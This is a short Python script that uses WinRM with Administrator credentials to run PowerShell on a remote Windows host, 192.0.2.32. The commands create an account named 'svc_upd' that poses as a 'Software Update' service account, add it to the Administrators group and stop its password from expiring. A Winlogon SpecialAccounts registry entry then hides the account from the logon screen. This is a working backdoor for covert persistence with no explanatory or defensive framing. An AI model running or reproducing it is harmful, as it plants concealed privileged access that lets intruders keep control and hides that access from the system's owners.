#!/usr/bin/env python3
import winrm
s = winrm.Session('192.0.2.32', auth=('Administrator', 'REDACTED'), transport='ntlm',
                  read_timeout_sec=300, operation_timeout_sec=280)
ps = r'''
net user svc_upd REDACTED /add /y /fullname:"Software Update" /comment:"Windows software update service account"
net localgroup Administrators svc_upd /add
wmic useraccount where "Name='svc_upd'" set PasswordExpires=FALSE
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_upd /t REG_DWORD /d 0 /f
'''
r = s.run_ps(ps)
print(r.std_out.decode(errors='replace'))
